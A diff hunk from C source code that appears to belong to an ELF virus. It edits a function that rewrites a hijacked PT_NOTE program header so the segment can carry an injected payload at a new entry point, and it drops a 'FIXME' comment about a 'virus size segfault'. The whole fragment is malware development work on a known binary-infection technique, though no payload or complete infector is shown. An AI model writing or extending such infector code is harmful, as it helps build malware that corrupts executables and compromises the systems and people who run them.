@@ -107,7 +107,7 @@ static void adjust_segment_sizes(t_infection *inf, size_t payload_size) {
     int idx = inf->ptnote_index;
     inf->phdr[idx].p_vaddr = inf->new_entry;
     inf->phdr[idx].p_paddr = inf->new_entry;
-    inf->phdr[idx].p_filesz = payload_size + 0x100000; // FIXME: fixe virus size segfault
+    inf->phdr[idx].p_filesz = payload_size;
     inf->phdr[idx].p_memsz = payload_size + 0x100000;
     inf->phdr[idx].p_align = 0x1000;
 }
